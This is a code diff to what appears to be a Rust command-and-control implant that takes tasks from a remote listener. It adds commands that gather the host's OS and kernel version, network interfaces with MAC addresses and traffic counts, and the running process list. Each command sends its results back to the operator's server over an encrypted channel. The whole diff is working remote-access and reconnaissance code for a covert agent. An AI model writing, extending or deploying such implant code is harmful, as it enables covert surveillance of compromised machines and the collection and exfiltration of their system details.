@@ -202,10 +202,17 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 }
             }
             "info" => {
+                let mut sys = sysinfo::System::new_all();
+                sys.refresh_all();
+
                 let mut output = String::new();
                 output = output + "\n";
                 output = output + format!("{:<12} : {}\n", "NAME", agent_name.to_string()).as_str();
                 output = output + format!("{:<12} : {}\n", "HOSTNAME", hostname.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "SYSTEM",
+                    sysinfo::System::name().unwrap()).as_str();
+                output = output + format!("{:<12} : {}\n", "KERNEL",
+                    sysinfo::System::kernel_version().unwrap()).as_str();
                 output = output + format!("{:<12} : {}\n", "OS", 
                     format!("{}/{}", os.to_string(), arch.to_string())).as_str();
                 output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
@@ -265,6 +272,60 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         ).await;
                     }
                 }
+            }
+            "net" => {
+                let mut sys = sysinfo::System::new_all();
+                sys.refresh_all();
+
+                let networks = sysinfo::Networks::new_with_refreshed_list();
+
+                let mut output = String::new();
+                output = output + "\n";
+                for (interface_name, data) in &networks {
+                    output = output + format!(
+                        "{interface_name}:\n\t{}\n\t{}/{} B\n",
+                        data.mac_address(),
+                        data.received(),
+                        data.transmitted()
+                    ).as_str();
+                }
+
+                post_task_result(
+                    &mut hconnect,
+                    output.as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await;
+            }
+            "ps" => {
+                let mut sys = sysinfo::System::new_all();
+                sys.refresh_all();
+
+                let args = task_args[1..].join(" ");
+                let fx: Vec<&str> = args.split(":").collect();
+                let filter = fx[0];
+                let exclude = fx[1];
+
+                let mut output = String::new();
+                output = output + "\n";
+                for (pid, process) in sys.processes() {
+                    if  (filter == "*" && exclude == "") ||
+                        (filter == "*" && !process.name().contains(exclude.clone())) ||
+                        (process.name().contains(filter.clone()) && exclude == "") ||
+                        (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
+                    {
+                        output = output + format!("{pid}\t{}\n", process.name()).as_str();
+                    }
+                }
+
+                post_task_result(
+                    &mut hconnect,
+                    output.as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await;
             }
             "pwd" => {
                 match std::env::current_dir() {
